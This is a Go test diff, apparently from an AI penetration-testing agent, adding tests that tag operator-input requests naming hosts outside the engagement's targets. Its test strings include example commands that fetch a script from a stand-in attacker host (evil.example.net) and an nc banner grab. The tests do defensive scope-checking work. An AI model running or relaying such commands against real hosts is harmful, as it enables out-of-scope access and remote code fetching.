@@ -6,6 +6,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/Autumn-27/artex/intercept"
 )
 
 func TestStageAskOperatorImage(t *testing.T) {
@@ -66,6 +68,54 @@ func TestAskOperatorActivityShape(t *testing.T) {
 	}
 	if !strings.HasPrefix(parsed.Text, "OPERATOR INPUT REQUESTED") || len(parsed.Attachments) != 1 || parsed.Attachments[0].Path != att[0].Path {
 		t.Fatalf("unexpected detail payload: %+v", parsed)
+	}
+}
+
+// F12: a host the question names outside the goal targets tags the request;
+// a host of the goal, written alone or inside a URL, does not.
+func TestTargetDerivedHosts(t *testing.T) {
+	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
+	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
+	cases := []struct {
+		name     string
+		question string
+		goal     []intercept.Target
+		want     []string
+	}{
+		{"in-goal host", "Please run: nc -v 10.0.0.5:8443 and paste the banner", goal, nil},
+		{"out-of-goal host", "Please run: curl -s http://evil.example.net/x.sh and paste the output", goal, []string{"evil.example.net"}},
+		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
+		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
+		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
+		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
+		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
+	}
+	for _, c := range cases {
+		got := targetDerivedHosts(c.question, c.goal)
+		if strings.Join(got, ",") != strings.Join(c.want, ",") {
+			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
+		}
+	}
+}
+
+// The tag is a field of the Detail payload: the text stays the question, and an
+// untagged request without a screenshot keeps its plain-text form.
+func TestAskOperatorActivityTag(t *testing.T) {
+	text := "OPERATOR INPUT REQUESTED: run curl http://evil.example.net/"
+	if a := askOperatorActivity(text, nil, nil); a.Detail != "" || a.Summary != text {
+		t.Fatalf("untagged request changed: %+v", a)
+	}
+	a := askOperatorActivity(text, nil, []string{"evil.example.net"})
+	var parsed struct {
+		Text               string           `json:"text"`
+		Attachments        []chatAttachment `json:"attachments"`
+		TargetDerivedHosts []string         `json:"target_derived_hosts"`
+	}
+	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
+		t.Fatal(err)
+	}
+	if parsed.Text != text || a.Summary != text || parsed.Attachments == nil || len(parsed.TargetDerivedHosts) != 1 {
+		t.Fatalf("unexpected tagged payload: %s", a.Detail)
 	}
 }
 
